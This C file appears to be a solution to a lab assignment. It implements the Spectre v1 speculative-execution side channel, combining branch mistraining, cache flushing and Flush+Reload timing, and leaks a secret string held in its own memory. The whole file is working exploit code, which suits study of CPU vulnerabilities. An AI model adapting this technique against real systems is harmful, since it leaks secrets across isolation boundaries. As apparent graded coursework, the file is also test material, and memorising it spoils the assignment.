#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

/* ---- Tunables ----------------------------------------------------------- */
/* Cycle threshold that separates an L1 hit from a DRAM miss.  Re-measure on
   the grading machine if the attack is noisy: a cache hit is typically
   < 100 cycles, a miss > 200.  80 is a safe default on Intel/AMD. */
#define CACHE_HIT_THRESHOLD 80

/* Training:attack ratio.  Of every TRAIN_RATIO calls to victim_function,
   TRAIN_RATIO-1 use a legitimate x (trains the local PHT entry to "taken"
   and primes the global BHR), and the last one is the speculative leak. */
#define TRAIN_RATIO  6
#define ROUNDS       30      /* victim calls per try         */
#define TRIES       999      /* outer retry budget per byte  */

/* ---- Victim ------------------------------------------------------------- */
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

/* Sink to keep victim_function from being optimised away. */
uint8_t temp = 0;

void victim_function(size_t x) {
  if (x < array1_size) {
    temp ^= array2[array1[x] * 512];
  }
}

/* ---- Attack ------------------------------------------------------------- *
 *
 * Strategy (Spectre v1, Kocher et al.):
 *
 *   1. Flush every cache line of the side-channel buffer (array2).
 *   2. Mistrain the bounds-check branch by calling victim_function() many
 *      times with a *legitimate* x so the predictor learns "taken".
 *   3. Flush array1_size so the comparison stalls waiting on DRAM, giving
 *      the speculative load enough time to fetch array2[array1[x]*512].
 *   4. Call victim_function() with x = malicious_x (= secret_addr - array1).
 *      The branch is mispredicted "taken"; the speculative load brings the
 *      relevant array2 line into cache before the misprediction is squashed.
 *   5. Flush+Reload: time every array2[i*512] read.  The fastest one is i =
 *      array1[malicious_x] = secret_byte.
 *   6. Repeat to accumulate statistics; bail out early on a clear winner.
 *
 * Notes:
 *   - Training/attack selection is branchless (bit-predication) so we do
 *     not pollute the global BHR with our own conditional jumps.
 *   - The reload order is permuted by a coprime stride so the L1 hardware
 *     prefetcher can't follow us.
 */
void attack(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i;
  unsigned int junk = 0;
  size_t training_x, x;
  register uint64_t t0, t1;
  volatile uint8_t *addr;

  for (i = 0; i < 256; i++) results[i] = 0;

  for (tries = TRIES; tries > 0; tries--) {

    /* 1) Flush the side channel. */
    for (i = 0; i < 256; i++) _mm_clflush(&array2[i * 512]);

    /* 2+3+4) Train the predictor, then strike. */
    training_x = tries % array1_size;
    for (j = ROUNDS - 1; j >= 0; j--) {

      /* Flush the bounds variable so the comparison takes ~DRAM-latency to
         resolve, widening the speculation window. */
      _mm_clflush(&array1_size);

      /* Small delay to let the flush retire before we depend on it. */
      for (volatile int z = 0; z < 100; z++) {}

      /* Branchless: x = (j % TRAIN_RATIO == 0) ? malicious_x : training_x.
         Avoids planting an extra jump in the BHR. */
      x = ((j % TRAIN_RATIO) - 1) & ~0xFFFF;     /* 0x...0000 if attack, 0 otherwise */
      x = (x | (x >> 16));                       /* -1 if attack, 0 otherwise        */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Speculative leak. */
      victim_function(x);
    }

    /* 5) Flush+Reload.  Walk array2 in a prefetcher-hostile order. */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &array2[mix_i * 512];

      _mm_mfence();
      t0 = __rdtscp(&junk);
      junk = *addr;
      _mm_lfence();
      t1 = __rdtscp(&junk) - t0;

      /* Count only cache hits, and don't count the training byte
         (array1[training_x]) -- that one is hot for legitimate reasons. */
      if (t1 <= CACHE_HIT_THRESHOLD &&
          mix_i != array1[tries % array1_size])
        results[mix_i]++;
    }

    /* 6) Find top-2 and check for an early-exit clear winner. */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) { k = j; j = i; }
      else if (k < 0 || results[i] >= results[k]) { k = i; }
    }
    if (results[j] >= 2 * results[k] + 5 ||
        (results[j] == 2 && results[k] == 0))
      break;
  }

  /* Keep junk live so the compiler can't elide the timing loop. */
  results[0] ^= junk & 0;

  value[0] = (uint8_t)j;  score[0] = results[j];
  value[1] = (uint8_t)k;  score[1] = results[k];
}

/* ---- Driver (unchanged) ------------------------------------------------- */
int main(int argc, const char **argv) {
  printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
  size_t malicious_x = (size_t)(secret - (char *)array1);
  int score[2], len = strlen(secret);
  uint8_t value[2];

  for (size_t i = 0; i < sizeof(array2); i++) array2[i] = 1;

  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    attack(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d ", value[0],
           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X='%c' score=%d)", value[1],
             (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
    printf("\n");
  }
  return 0;
}
